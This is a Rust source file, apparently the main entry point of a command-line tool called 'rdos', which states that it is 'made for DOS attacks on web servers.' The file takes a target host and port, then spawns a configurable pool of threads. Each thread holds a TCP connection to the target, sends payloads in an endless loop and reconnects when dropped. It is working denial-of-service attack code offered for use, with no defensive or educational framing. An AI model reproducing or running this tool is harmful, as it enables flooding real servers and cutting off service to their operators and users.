use std::thread;

use clap::{Arg, Command};
use ipv4_spec::IPv4Spec;
use worker::TcpWorker;

mod ipv4_spec;
mod worker;

fn main() {
    let cmd = Command::new("rdos")
        .version("1.0")
        .about("rdos is a tool made for DOS attacks on web servers.")
        .arg(
            Arg::new("target")
                .required(true)
                .help("The target host. Examples: 127.0.0.1:80, mywebsite.com:80"),
        )
        .arg(
            Arg::new("threads")
                .required(false)
                .short('t')
                .long("threads")
                .default_value("64")
                .help("The size of the thread pool."),
        )
        .arg(
            Arg::new("size")
                .required(false)
                .short('s')
                .long("size")
                .default_value("64")
                .help("The size of the payloads."),
        )
        .arg(
            Arg::new("delay")
                .required(false)
                .short('d')
                .long("delay")
                .default_value("200")
                .help("The delay in miliseconds between sending the next payload."),
        );

    let matches = cmd.get_matches();

    let target = matches
        .get_one::<String>("target")
        .expect("Target is required.");

    let thread_count = matches
        .get_one::<String>("threads")
        .unwrap()
        .parse::<usize>()
        .expect("Threads must be a number of type usize");

    let payload_size = matches
        .get_one::<String>("size")
        .unwrap()
        .parse::<usize>()
        .expect("Size must be a number of type usize");

    let delay_ms = matches
        .get_one::<String>("delay")
        .unwrap()
        .parse::<usize>()
        .expect("Delay must be a number of type usize");

    let ip_address = ipv4_spec::IPv4Spec::parse(target.to_string()).unwrap();

    run(ip_address, thread_count, payload_size, delay_ms);
}

fn run(ip_address: IPv4Spec, thread_count: usize, payload_size: usize, delay_ms: usize) {
    println!(
        "Connecting to: {}:{}",
        ip_address.get_host(),
        ip_address.get_port()
    );

    let mut thread_pool = Vec::new();

    for _ in 0..thread_count {
        let ip_clone = ip_address.clone();

        let thread = thread::spawn(move || run_worker(ip_clone, payload_size, delay_ms));
        thread_pool.push(thread);
    }

    for thread in thread_pool {
        thread.join().expect("Thread could not finish correctly.");
    }
}

fn run_worker(ip_address: IPv4Spec, payload_size: usize, delay_ms: usize) {
    let err_msg = format!(
        "Failed to connect to {}:{}",
        ip_address.get_host(),
        ip_address.get_port()
    );

    let mut worker = TcpWorker::new(ip_address.clone(), payload_size).expect(err_msg.as_str());
    println!("Worker connected. Starting DOS.");

    loop {
        if worker.is_finished() {
            println!("Worker disconnected. Restarting.");
            _ = worker.restart(ip_address.clone());
        }

        worker.work();
        worker.sleep(delay_ms);
    }
}
